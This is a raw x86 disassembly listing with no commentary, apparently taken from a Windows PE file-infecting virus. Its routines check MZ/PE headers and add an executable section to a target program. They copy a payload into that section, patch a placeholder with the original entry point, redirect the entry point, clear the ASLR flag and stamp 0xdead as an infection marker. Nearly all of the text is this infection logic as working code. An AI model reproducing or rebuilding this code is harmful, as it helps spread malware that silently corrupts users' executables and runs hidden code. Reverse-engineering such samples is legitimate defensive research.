  401e90:	66 89 4d f8          	mov    %cx,-0x8(%ebp)
  401e94:	ba 6c 00 00 00       	mov    $0x6c,%edx
  401e99:	66 89 55 fa          	mov    %dx,-0x6(%ebp)
  401e9d:	33 c0                	xor    %eax,%eax
  401e9f:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  401ea3:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  401ea6:	51                   	push   %ecx
  401ea7:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401eaa:	8b 42 30             	mov    0x30(%edx),%eax
  401ead:	50                   	push   %eax
  401eae:	e8 1d fb ff ff       	call   0x4019d0
  401eb3:	83 c4 08             	add    $0x8,%esp
  401eb6:	85 c0                	test   %eax,%eax
  401eb8:	75 0b                	jne    0x401ec5
  401eba:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401ebd:	8b 51 18             	mov    0x18(%ecx),%edx
  401ec0:	89 55 e0             	mov    %edx,-0x20(%ebp)
  401ec3:	eb 1c                	jmp    0x401ee1
  401ec5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401ec8:	8b 08                	mov    (%eax),%ecx
  401eca:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  401ecd:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401ed0:	83 7a 18 00          	cmpl   $0x0,0x18(%edx)
  401ed4:	74 0b                	je     0x401ee1
  401ed6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ed9:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401edc:	3b 48 0c             	cmp    0xc(%eax),%ecx
  401edf:	75 c2                	jne    0x401ea3
  401ee1:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ee4:	8b e5                	mov    %ebp,%esp
  401ee6:	5d                   	pop    %ebp
  401ee7:	c3                   	ret
  401ee8:	cc                   	int3
  401ee9:	cc                   	int3
  401eea:	cc                   	int3
  401eeb:	cc                   	int3
  401eec:	cc                   	int3
  401eed:	cc                   	int3
  401eee:	cc                   	int3
  401eef:	cc                   	int3
  401ef0:	55                   	push   %ebp
  401ef1:	8b ec                	mov    %esp,%ebp
  401ef3:	5d                   	pop    %ebp
  401ef4:	c3                   	ret
  401ef5:	cc                   	int3
  401ef6:	cc                   	int3
  401ef7:	cc                   	int3
  401ef8:	cc                   	int3
  401ef9:	cc                   	int3
  401efa:	cc                   	int3
  401efb:	cc                   	int3
  401efc:	cc                   	int3
  401efd:	cc                   	int3
  401efe:	cc                   	int3
  401eff:	cc                   	int3
  401f00:	55                   	push   %ebp
  401f01:	8b ec                	mov    %esp,%ebp
  401f03:	83 ec 1c             	sub    $0x1c,%esp
  401f06:	8b 45 08             	mov    0x8(%ebp),%eax
  401f09:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f0c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401f0f:	0f b7 11             	movzwl (%ecx),%edx
  401f12:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
  401f18:	74 07                	je     0x401f21
  401f1a:	33 c0                	xor    %eax,%eax
  401f1c:	e9 33 02 00 00       	jmp    0x402154
  401f21:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401f24:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f27:	03 48 3c             	add    0x3c(%eax),%ecx
  401f2a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401f2d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401f30:	81 3a 50 45 00 00    	cmpl   $0x4550,(%edx)
  401f36:	74 07                	je     0x401f3f
  401f38:	33 c0                	xor    %eax,%eax
  401f3a:	e9 15 02 00 00       	jmp    0x402154
  401f3f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f42:	05 08 01 00 00       	add    $0x108,%eax
  401f47:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401f4a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401f4d:	0f b7 51 06          	movzwl 0x6(%ecx),%edx
  401f51:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401f54:	6a 28                	push   $0x28
  401f56:	6a 00                	push   $0x0
  401f58:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f5b:	6b c0 28             	imul   $0x28,%eax,%eax
  401f5e:	03 45 f8             	add    -0x8(%ebp),%eax
  401f61:	50                   	push   %eax
  401f62:	e8 79 f9 ff ff       	call   0x4018e0
  401f67:	83 c4 0c             	add    $0xc,%esp
  401f6a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401f6d:	6b c9 28             	imul   $0x28,%ecx,%ecx
  401f70:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401f73:	8b 45 14             	mov    0x14(%ebp),%eax
  401f76:	89 44 0a 24          	mov    %eax,0x24(%edx,%ecx,1)
  401f7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401f7d:	83 e9 01             	sub    $0x1,%ecx
  401f80:	6b c9 28             	imul   $0x28,%ecx,%ecx
  401f83:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401f86:	83 ea 01             	sub    $0x1,%edx
  401f89:	6b d2 28             	imul   $0x28,%edx,%edx
  401f8c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f8f:	8b 4c 08 14          	mov    0x14(%eax,%ecx,1),%ecx
  401f93:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f96:	03 4c 10 10          	add    0x10(%eax,%edx,1),%ecx
  401f9a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401f9d:	8b 42 3c             	mov    0x3c(%edx),%eax
  401fa0:	83 e8 01             	sub    $0x1,%eax
  401fa3:	23 c8                	and    %eax,%ecx
  401fa5:	74 38                	je     0x401fdf
  401fa7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401faa:	83 e9 01             	sub    $0x1,%ecx
  401fad:	6b c9 28             	imul   $0x28,%ecx,%ecx
  401fb0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401fb3:	83 ea 01             	sub    $0x1,%edx
  401fb6:	6b d2 28             	imul   $0x28,%edx,%edx
  401fb9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fbc:	8b 4c 08 14          	mov    0x14(%eax,%ecx,1),%ecx
  401fc0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fc3:	03 4c 10 10          	add    0x10(%eax,%edx,1),%ecx
  401fc7:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401fca:	8b 42 3c             	mov    0x3c(%edx),%eax
  401fcd:	83 e8 01             	sub    $0x1,%eax
  401fd0:	f7 d0                	not    %eax
  401fd2:	23 c8                	and    %eax,%ecx
  401fd4:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401fd7:	03 4a 3c             	add    0x3c(%edx),%ecx
  401fda:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401fdd:	eb 23                	jmp    0x402002
  401fdf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401fe2:	83 e8 01             	sub    $0x1,%eax
  401fe5:	6b c0 28             	imul   $0x28,%eax,%eax
  401fe8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401feb:	83 e9 01             	sub    $0x1,%ecx
  401fee:	6b c9 28             	imul   $0x28,%ecx,%ecx
  401ff1:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401ff4:	8b 44 02 14          	mov    0x14(%edx,%eax,1),%eax
  401ff8:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401ffb:	03 44 0a 10          	add    0x10(%edx,%ecx,1),%eax
  401fff:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402002:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402005:	6b c0 28             	imul   $0x28,%eax,%eax
  402008:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40200b:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40200e:	89 54 01 14          	mov    %edx,0x14(%ecx,%eax,1)
  402012:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402015:	83 e8 01             	sub    $0x1,%eax
  402018:	6b c0 28             	imul   $0x28,%eax,%eax
  40201b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40201e:	83 e9 01             	sub    $0x1,%ecx
  402021:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402024:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402027:	8b 44 02 0c          	mov    0xc(%edx,%eax,1),%eax
  40202b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40202e:	03 44 0a 08          	add    0x8(%edx,%ecx,1),%eax
  402032:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402035:	8b 51 38             	mov    0x38(%ecx),%edx
  402038:	83 ea 01             	sub    $0x1,%edx
  40203b:	23 c2                	and    %edx,%eax
  40203d:	74 38                	je     0x402077
  40203f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402042:	83 e8 01             	sub    $0x1,%eax
  402045:	6b c0 28             	imul   $0x28,%eax,%eax
  402048:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40204b:	83 e9 01             	sub    $0x1,%ecx
  40204e:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402051:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402054:	8b 44 02 0c          	mov    0xc(%edx,%eax,1),%eax
  402058:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40205b:	03 44 0a 08          	add    0x8(%edx,%ecx,1),%eax
  40205f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402062:	8b 51 38             	mov    0x38(%ecx),%edx
  402065:	83 ea 01             	sub    $0x1,%edx
  402068:	f7 d2                	not    %edx
  40206a:	23 c2                	and    %edx,%eax
  40206c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40206f:	03 41 38             	add    0x38(%ecx),%eax
  402072:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402075:	eb 23                	jmp    0x40209a
  402077:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40207a:	83 ea 01             	sub    $0x1,%edx
  40207d:	6b d2 28             	imul   $0x28,%edx,%edx
  402080:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402083:	83 e8 01             	sub    $0x1,%eax
  402086:	6b c0 28             	imul   $0x28,%eax,%eax
  402089:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40208c:	8b 54 11 0c          	mov    0xc(%ecx,%edx,1),%edx
  402090:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402093:	03 54 01 08          	add    0x8(%ecx,%eax,1),%edx
  402097:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40209a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40209d:	6b d2 28             	imul   $0x28,%edx,%edx
  4020a0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020a3:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4020a6:	89 4c 10 0c          	mov    %ecx,0xc(%eax,%edx,1)
  4020aa:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4020ad:	8b 42 38             	mov    0x38(%edx),%eax
  4020b0:	83 e8 01             	sub    $0x1,%eax
  4020b3:	23 45 10             	and    0x10(%ebp),%eax
  4020b6:	74 19                	je     0x4020d1
  4020b8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4020bb:	8b 51 38             	mov    0x38(%ecx),%edx
  4020be:	83 ea 01             	sub    $0x1,%edx
  4020c1:	f7 d2                	not    %edx
  4020c3:	23 55 10             	and    0x10(%ebp),%edx
  4020c6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4020c9:	03 50 38             	add    0x38(%eax),%edx
  4020cc:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4020cf:	eb 06                	jmp    0x4020d7
  4020d1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4020d4:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4020d7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4020da:	6b d2 28             	imul   $0x28,%edx,%edx
  4020dd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020e0:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4020e3:	89 4c 10 10          	mov    %ecx,0x10(%eax,%edx,1)
  4020e7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4020ea:	6b d2 28             	imul   $0x28,%edx,%edx
  4020ed:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020f0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4020f3:	89 4c 10 08          	mov    %ecx,0x8(%eax,%edx,1)
  4020f7:	6a 08                	push   $0x8
  4020f9:	8b 55 0c             	mov    0xc(%ebp),%edx
  4020fc:	52                   	push   %edx
  4020fd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402100:	6b c0 28             	imul   $0x28,%eax,%eax
  402103:	03 45 f8             	add    -0x8(%ebp),%eax
  402106:	50                   	push   %eax
  402107:	e8 92 10 00 00       	call   0x40319e
  40210c:	83 c4 0c             	add    $0xc,%esp
  40210f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402112:	66 8b 51 06          	mov    0x6(%ecx),%dx
  402116:	66 83 c2 01          	add    $0x1,%dx
  40211a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40211d:	66 89 50 06          	mov    %dx,0x6(%eax)
  402121:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402124:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402127:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40212a:	6b d2 28             	imul   $0x28,%edx,%edx
  40212d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402130:	8b 4c 08 0c          	mov    0xc(%eax,%ecx,1),%ecx
  402134:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402137:	03 4c 10 08          	add    0x8(%eax,%edx,1),%ecx
  40213b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40213e:	89 4a 50             	mov    %ecx,0x50(%edx)
  402141:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402144:	c7 40 58 00 00 00 00 	movl   $0x0,0x58(%eax)
  40214b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40214e:	6b c0 28             	imul   $0x28,%eax,%eax
  402151:	03 45 f8             	add    -0x8(%ebp),%eax
  402154:	8b e5                	mov    %ebp,%esp
  402156:	5d                   	pop    %ebp
  402157:	c2 10 00             	ret    $0x10
  40215a:	cc                   	int3
  40215b:	cc                   	int3
  40215c:	cc                   	int3
  40215d:	cc                   	int3
  40215e:	cc                   	int3
  40215f:	cc                   	int3
  402160:	55                   	push   %ebp
  402161:	8b ec                	mov    %esp,%ebp
  402163:	83 ec 2c             	sub    $0x2c,%esp
  402166:	8b 45 0c             	mov    0xc(%ebp),%eax
  402169:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40216c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40216f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402172:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402175:	8b 45 08             	mov    0x8(%ebp),%eax
  402178:	03 42 3c             	add    0x3c(%edx),%eax
  40217b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40217e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402181:	81 79 08 ad de 00 00 	cmpl   $0xdead,0x8(%ecx)
  402188:	0f 84 32 01 00 00    	je     0x4022c0
  40218e:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402191:	0f b7 42 5e          	movzwl 0x5e(%edx),%eax
  402195:	83 e0 bf             	and    $0xffffffbf,%eax
  402198:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40219b:	66 89 41 5e          	mov    %ax,0x5e(%ecx)
  40219f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4021a2:	8b 42 3c             	mov    0x3c(%edx),%eax
  4021a5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4021a8:	8d 94 01 08 01 00 00 	lea    0x108(%ecx,%eax,1),%edx
  4021af:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4021b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4021b5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021b8:	c7 45 e8 c0 10 00 00 	movl   $0x10c0,-0x18(%ebp)
  4021bf:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4021c2:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4021c8:	74 14                	je     0x4021de
  4021ca:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4021cd:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  4021d3:	81 c2 00 10 00 00    	add    $0x1000,%edx
  4021d9:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4021dc:	eb 06                	jmp    0x4021e4
  4021de:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4021e1:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4021e4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4021e7:	03 4d d8             	add    -0x28(%ebp),%ecx
  4021ea:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4021ed:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4021f0:	0f b7 42 06          	movzwl 0x6(%edx),%eax
  4021f4:	6b c0 28             	imul   $0x28,%eax,%eax
  4021f7:	05 48 01 00 00       	add    $0x148,%eax
  4021fc:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4021ff:	3b 41 54             	cmp    0x54(%ecx),%eax
  402202:	0f 83 b8 00 00 00    	jae    0x4022c0
  402208:	68 00 00 00 60       	push   $0x60000000
  40220d:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402210:	52                   	push   %edx
  402211:	68 80 52 40 00       	push   $0x405280
  402216:	8b 45 08             	mov    0x8(%ebp),%eax
  402219:	50                   	push   %eax
  40221a:	e8 e1 fc ff ff       	call   0x401f00
  40221f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402222:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402226:	0f 84 8e 00 00 00    	je     0x4022ba
  40222c:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40222f:	8b 55 08             	mov    0x8(%ebp),%edx
  402232:	03 51 14             	add    0x14(%ecx),%edx
  402235:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402238:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40223b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40223e:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402241:	51                   	push   %ecx
  402242:	68 c0 41 40 00       	push   $0x4041c0
  402247:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40224a:	52                   	push   %edx
  40224b:	e8 4e 0f 00 00       	call   0x40319e
  402250:	83 c4 0c             	add    $0xc,%esp
  402253:	b8 01 00 00 00       	mov    $0x1,%eax
  402258:	85 c0                	test   %eax,%eax
  40225a:	74 3a                	je     0x402296
  40225c:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40225f:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  402262:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  402265:	81 3a cc cc cc cc    	cmpl   $0xcccccccc,(%edx)
  40226b:	75 1e                	jne    0x40228b
  40226d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402270:	81 78 04 cc cc cc cc 	cmpl   $0xcccccccc,0x4(%eax)
  402277:	75 12                	jne    0x40228b
  402279:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40227c:	8b 51 28             	mov    0x28(%ecx),%edx
  40227f:	33 c0                	xor    %eax,%eax
  402281:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402284:	89 11                	mov    %edx,(%ecx)
  402286:	89 41 04             	mov    %eax,0x4(%ecx)
  402289:	eb 0b                	jmp    0x402296
  40228b:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40228e:	83 c2 01             	add    $0x1,%edx
  402291:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402294:	eb bd                	jmp    0x402253
  402296:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402299:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40229c:	2b 48 14             	sub    0x14(%eax),%ecx
  40229f:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4022a2:	03 4a 0c             	add    0xc(%edx),%ecx
  4022a5:	2b 4d 08             	sub    0x8(%ebp),%ecx
  4022a8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4022ab:	89 48 28             	mov    %ecx,0x28(%eax)
  4022ae:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022b1:	c7 41 08 ad de 00 00 	movl   $0xdead,0x8(%ecx)
  4022b8:	eb 06                	jmp    0x4022c0
  4022ba:	8b 55 0c             	mov    0xc(%ebp),%edx
  4022bd:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4022c0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4022c3:	8b e5                	mov    %ebp,%esp
  4022c5:	5d                   	pop    %ebp
  4022c6:	c3                   	ret
  4022c7:	cc                   	int3
  4022c8:	cc                   	int3
  4022c9:	cc                   	int3
  4022ca:	cc                   	int3
  4022cb:	cc                   	int3
  4022cc:	cc                   	int3
  4022cd:	cc                   	int3
  4022ce:	cc                   	int3
  4022cf:	cc                   	int3
  4022d0:	55                   	push   %ebp
  4022d1:	8b ec                	mov    %esp,%ebp
  4022d3:	83 ec 1c             	sub    $0x1c,%esp
  4022d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4022dc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4022df:	0f b7 11             	movzwl (%ecx),%edx
  4022e2:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
  4022e8:	74 07                	je     0x4022f1
  4022ea:	33 c0                	xor    %eax,%eax
  4022ec:	e9 33 02 00 00       	jmp    0x402524
  4022f1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4022f4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022f7:	03 48 3c             	add    0x3c(%eax),%ecx
  4022fa:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4022fd:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402300:	81 3a 50 45 00 00    	cmpl   $0x4550,(%edx)
  402306:	74 07                	je     0x40230f
  402308:	33 c0                	xor    %eax,%eax
  40230a:	e9 15 02 00 00       	jmp    0x402524
  40230f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402312:	05 f8 00 00 00       	add    $0xf8,%eax
  402317:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40231a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40231d:	0f b7 51 06          	movzwl 0x6(%ecx),%edx
  402321:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402324:	6a 28                	push   $0x28
  402326:	6a 00                	push   $0x0
  402328:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40232b:	6b c0 28             	imul   $0x28,%eax,%eax
  40232e:	03 45 f8             	add    -0x8(%ebp),%eax
  402331:	50                   	push   %eax
  402332:	e8 a9 f5 ff ff       	call   0x4018e0
  402337:	83 c4 0c             	add    $0xc,%esp
  40233a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40233d:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402340:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402343:	8b 45 14             	mov    0x14(%ebp),%eax
  402346:	89 44 0a 24          	mov    %eax,0x24(%edx,%ecx,1)
  40234a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40234d:	83 e9 01             	sub    $0x1,%ecx
  402350:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402353:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402356:	83 ea 01             	sub    $0x1,%edx
  402359:	6b d2 28             	imul   $0x28,%edx,%edx
  40235c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40235f:	8b 4c 08 14          	mov    0x14(%eax,%ecx,1),%ecx
  402363:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402366:	03 4c 10 10          	add    0x10(%eax,%edx,1),%ecx
  40236a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40236d:	8b 42 3c             	mov    0x3c(%edx),%eax
  402370:	83 e8 01             	sub    $0x1,%eax
  402373:	23 c8                	and    %eax,%ecx
  402375:	74 38                	je     0x4023af
  402377:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40237a:	83 e9 01             	sub    $0x1,%ecx
  40237d:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402380:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402383:	83 ea 01             	sub    $0x1,%edx
  402386:	6b d2 28             	imul   $0x28,%edx,%edx
  402389:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40238c:	8b 4c 08 14          	mov    0x14(%eax,%ecx,1),%ecx
  402390:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402393:	03 4c 10 10          	add    0x10(%eax,%edx,1),%ecx
  402397:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40239a:	8b 42 3c             	mov    0x3c(%edx),%eax
  40239d:	83 e8 01             	sub    $0x1,%eax
  4023a0:	f7 d0                	not    %eax
  4023a2:	23 c8                	and    %eax,%ecx
  4023a4:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4023a7:	03 4a 3c             	add    0x3c(%edx),%ecx
  4023aa:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4023ad:	eb 23                	jmp    0x4023d2
  4023af:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4023b2:	83 e8 01             	sub    $0x1,%eax
  4023b5:	6b c0 28             	imul   $0x28,%eax,%eax
  4023b8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4023bb:	83 e9 01             	sub    $0x1,%ecx
  4023be:	6b c9 28             	imul   $0x28,%ecx,%ecx
  4023c1:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4023c4:	8b 44 02 14          	mov    0x14(%edx,%eax,1),%eax
  4023c8:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4023cb:	03 44 0a 10          	add    0x10(%edx,%ecx,1),%eax
  4023cf:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4023d2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4023d5:	6b c0 28             	imul   $0x28,%eax,%eax
  4023d8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4023db:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4023de:	89 54 01 14          	mov    %edx,0x14(%ecx,%eax,1)
  4023e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4023e5:	83 e8 01             	sub    $0x1,%eax
  4023e8:	6b c0 28             	imul   $0x28,%eax,%eax
  4023eb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4023ee:	83 e9 01             	sub    $0x1,%ecx
  4023f1:	6b c9 28             	imul   $0x28,%ecx,%ecx
  4023f4:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4023f7:	8b 44 02 0c          	mov    0xc(%edx,%eax,1),%eax
  4023fb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4023fe:	03 44 0a 08          	add    0x8(%edx,%ecx,1),%eax
  402402:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402405:	8b 51 38             	mov    0x38(%ecx),%edx
  402408:	83 ea 01             	sub    $0x1,%edx
  40240b:	23 c2                	and    %edx,%eax
  40240d:	74 38                	je     0x402447
  40240f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402412:	83 e8 01             	sub    $0x1,%eax
  402415:	6b c0 28             	imul   $0x28,%eax,%eax
  402418:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40241b:	83 e9 01             	sub    $0x1,%ecx
  40241e:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402421:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402424:	8b 44 02 0c          	mov    0xc(%edx,%eax,1),%eax
  402428:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40242b:	03 44 0a 08          	add    0x8(%edx,%ecx,1),%eax
  40242f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402432:	8b 51 38             	mov    0x38(%ecx),%edx
  402435:	83 ea 01             	sub    $0x1,%edx
  402438:	f7 d2                	not    %edx
  40243a:	23 c2                	and    %edx,%eax
  40243c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40243f:	03 41 38             	add    0x38(%ecx),%eax
  402442:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402445:	eb 23                	jmp    0x40246a
  402447:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40244a:	83 ea 01             	sub    $0x1,%edx
  40244d:	6b d2 28             	imul   $0x28,%edx,%edx
  402450:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402453:	83 e8 01             	sub    $0x1,%eax
  402456:	6b c0 28             	imul   $0x28,%eax,%eax
  402459:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40245c:	8b 54 11 0c          	mov    0xc(%ecx,%edx,1),%edx
  402460:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402463:	03 54 01 08          	add    0x8(%ecx,%eax,1),%edx
  402467:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40246a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40246d:	6b d2 28             	imul   $0x28,%edx,%edx
  402470:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402473:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402476:	89 4c 10 0c          	mov    %ecx,0xc(%eax,%edx,1)
  40247a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40247d:	8b 42 38             	mov    0x38(%edx),%eax
  402480:	83 e8 01             	sub    $0x1,%eax
  402483:	23 45 10             	and    0x10(%ebp),%eax
  402486:	74 19                	je     0x4024a1
